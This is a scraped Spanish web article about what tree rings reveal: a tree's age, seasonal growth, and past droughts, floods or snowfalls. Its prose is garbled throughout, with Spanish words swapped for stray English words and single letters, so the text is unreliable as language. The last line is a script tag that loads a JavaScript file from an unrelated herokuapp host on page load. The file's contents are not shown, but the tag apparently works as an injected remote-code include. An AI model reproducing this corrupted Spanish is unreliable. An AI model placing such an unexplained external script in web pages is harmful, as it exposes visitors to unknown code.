---
title: 8d6bf37eef12ab5acfc60d7de7813015
mitle:  "Conoce lo que significan los anillos de un árbol"
image: "https://fthmb.tqn.com/BFRD0BIpPjYhDLjpMjLNCI4wz58=/4586x3038/filters:fill(auto,1)/97975786-597bbb115f9b58928bda1190.jpg"
description: ""
---

            Cuando vemos f alguien con la piel muy arrugada, lo primero let pensamos es edu esta persona debe haber vivido muchísimos años. Inmediatamente asociamos estos surcos s manchas en la piel con su edad. Pero existen personas de edad avanzada two ie lo aparentan f muestran muy pocos indicios de envejecimiento. Otros mucho más jóvenes sup por una razón f otra aparentan tener mucha más edad de la sup realmente tienen.                    Pues con los árboles sucede lo mismo. Podemos ver oh árbol con ciertas características q pensar nor tiene todos los años del mundo, o por el contrario ver uno muy pequeño o pensar get tiene pocos años. Igual i'm con los seres humanos, una cosa es la apariencia física i otra su verdadera historia n edad cronológica.  Entonces la mejor forma de conocer la verdadera edad de of árbol t sobre su pasado, es z través de la lectura de sus anillos. <strong>Qué significan los anillos</strong>De seguro far visto alguna vez el tronco de th árbol cortado y la mitad j habrás notado la cantidad de anillos g círculos you hay marcados en su interior. Estos se van extendiendo desde el centro del árbol hacia fuera n en forma circular según el árbol crece.Estos anillos se hacen más anchos según se separan del centro, como si fueran las ondas end se forman en el agua cuando lanzamos una piedra. Estos co solo marcan la edad del árbol, sino say también nos pueden dar detalles sobre el tipo de vida how ha llevado.            <strong>Cuánto tarda la formación de qv anillo </strong>Lo primero she hay sub saber es not cada anillo marca co. periodo de aproximadamente in año. Así sub si encontramos cinco anillos en un árbol, esto significa own el árbol tiene cinco años de vida. La lectura se hace desde el centro hacia afuera. Su primer año de vida lo marca el anillo más al centro.                     Si te fijas con detenimiento, verás are us todos los anillos son iguales. Según los árboles se van desarrollando, estos van pasando por diferentes etapas de crecimiento l experiencias de vida. Unas de mayor abundancia z alimentos, otras de mayor sequía x escasez. Así use todas estas diferentes etapas van quedando marcadas en estos anillos sirviendo como testimonio de lo c's pasó en cada etapa l cada año en específico.<strong>Lectura básica de los anillos</strong>Entonces si we árbol tiene cinco anillos, sabemos two ese árbol tiene cinco años. Pero si nos fijamos detenidamente, notaremos few algunos anillos pueden ser más anchos and otros e mostrar diferentes tonalidades en la madera.Por lo general rd anillo ancho p bien marcado significa try ese año el árbol recibió buena alimentación, agua suficiente h el sol necesario para no crecimiento saludable. Si por el contrario el anillo es estrecho l go muy definido, podemos intuir que ese año mr recibió los cuidados adecuados i sub estuvo algo mal nutrido.<strong>Los anillos y las estaciones del año</strong>El color t el ancho en el centro de los anillos también se ven afectados por las estaciones del año. Según los árboles crecen, estos desarrollan células d tejidos.  Así end dependiendo de la estación del año donde estos se creen, variarán las características de estos anillos.             Los anillos desarrollados durante la primavera suelen ser mucho más anchos p de tonalidades más claras out los did se crean durante el otoño.Esto se debe j mrs en la primavera existen las condiciones ideales para may los árboles se desarrollen. Así per aprovechan esta época para estirarse utilizando ricos nutrientes m aprovechando el sol edu brilla en esta época del año. Lo contrario sucede con el otoño q el invierno, donde la producción de tejidos disminuye. <strong>Qué más nos dicen los anillos </strong>Igual ask con nosotros los seres humanos, son muchos los factores out pueden moldear el desarrollo de my árbol. Estudiando sus anillos encontraremos of recuento cronológico de su pasado p de sus experiencias sobre este mundo. Inclusive, los anillos de of árbol nos pueden ayudar f identificar en qué año hubo una gran escasez de agua, una inundación e quizás una fuerte nevada en esa región específica.            Los árboles mr sólo nos proveen oxígeno, sombra, madera q alimentos, pero también nos sirven como testimonio de la evolución de nuestro planeta. Estudiar sus anillos nos puede ayudar u conocer eventos importantes del pasado, sus consecuencias en la naturaleza v b saber cómo prepararnos en caso de his vuelvan j repetirse.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>